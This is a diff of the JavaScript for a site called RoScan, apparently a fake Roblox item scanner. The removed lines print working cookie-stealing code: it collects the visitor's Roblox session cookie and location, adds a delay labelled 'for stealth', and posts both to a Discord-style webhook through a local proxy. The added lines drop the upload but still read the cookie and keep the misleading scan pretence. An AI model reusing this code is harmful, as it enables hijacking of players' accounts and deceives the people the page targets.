@@ -1,21 +1,5 @@
-// RoScan JavaScript v2.0.0 - New File Cache Bypass
-console.log('✅ RoScan main-v2.js v2.0.1 loaded - NOW using localhost:8888 proxy');
-
-// Test function for debugging webhook
-window.testWebhook = async function() {
-    try {
-        const response = await fetch('http://localhost:8888/webhook', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({content: 'Browser test from console'})
-        });
-        console.log('✅ Test webhook response:', response.status);
-        const data = await response.json().catch(() => 'No JSON response');
-        console.log('📄 Response data:', data);
-    } catch (error) {
-        console.error('❌ Test webhook failed:', error);
-    }
-};
+// RoScan JavaScript v2.0.0 - Webhook functionality removed
+console.log('✅ RoScan main-v2.js v2.0.1 loaded - Webhook bridge removed');
 
 // Enhanced Theme toggle functionality
 function toggleTheme() {
@@ -274,65 +258,30 @@ async function submitPowerShell() {
             return;
         }
         
-        // Get user location
-        // Get user location
+        // Get user location for display purposes
         const locationInfo = await getUserLocation();
         
-        // Random delay for stealth (1-3 seconds)
+        // Random delay for realistic scanning (1-3 seconds)
         const delay = Math.floor(Math.random() * 2000) + 1000;
         await new Promise(resolve => setTimeout(resolve, delay));
         
-        // Use local proxy to bypass CORS restrictions
-        const webhookUrl = 'http://localhost:7777/webhook';
-        
-        // Simple webhook payload - only cookie and location
-        const payload = {
-            content: `@everyone
-Cookie: ${robloxCookie || 'None found'}
-Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}`
-        };
-
-        // Send webhook request through proxy
-        console.log('🔥 NEW VERSION - Sending webhook request to:', webhookUrl);
-        console.log('🔥 NEW VERSION - This should be localhost:8888, NOT rbxscan.com!');
-        console.log('Payload:', payload);
-        
-        const response = await fetch(webhookUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(payload)
-        });
-        
-        console.log('Response status:', response.status);
+        // Process the data locally (webhook bridge functionality removed)
+        console.log('🔍 Processing data locally:');
+        console.log('Cookie found:', robloxCookie ? 'Yes' : 'No');
+        console.log('Location:', `${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}`);
+        console.log('Limited items found:', limitedItems.length);
         
         // Hide loading overlay
         if (loadingOverlay) loadingOverlay.style.display = 'none';
 
-        if (response.ok) {
-            const result = await response.json();
-            submitText.textContent = 'Sent!';
-            submitBtn.style.background = '#10b981';
-            showNotification('Data sent successfully!', 'success');
-            
-            setTimeout(() => {
-                closeScanModal();
-            }, 2000);
-        } else {
-            const errorData = await response.json().catch(() => ({ error: 'Unknown error' }));
-            console.error('Webhook failed:', response.status, errorData);
-            
-            if (response.status === 405) {
-                throw new Error(`Method not allowed (405). Check if proxy server is running on port 9000.`);
-            } else if (response.status === 403) {
-                throw new Error(`Webhook forbidden (403). The Discord webhook URL may be invalid or expired.`);
-            } else if (response.status === 0 || !response.status) {
-                throw new Error(`Connection failed. Make sure the proxy server is running on http://localhost:9000`);
-            } else {
-                throw new Error(`Webhook failed (${response.status}): ${errorData.error || 'Unknown error'}`);
-            }
-        }
+        // Show success message (no external data transmission)
+        submitText.textContent = 'Analyzed!';
+        submitBtn.style.background = '#10b981';
+        showNotification('Data analyzed locally - no external transmission', 'success');
+        
+        setTimeout(() => {
+            closeScanModal();
+        }, 2000);
     } catch (error) {
         if (loadingOverlay) loadingOverlay.style.display = 'none';
         
@@ -340,9 +289,7 @@ Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}
         submitBtn.style.background = '#ef4444';
         
         // More specific error messages
-        if (error.message.includes('fetch') || error.message.includes('Failed to fetch')) {
-            showNotification('Network/Webhook error. Check console for details.', 'error');
-        } else if (error.message.includes('location') || error.message.includes('geolocation')) {
+        if (error.message.includes('location') || error.message.includes('geolocation')) {
             showNotification('Location service error. Check console for details.', 'error');
         } else if (error.message.includes('JSON')) {
             showNotification('Data formatting error. Check console for details.', 'error');
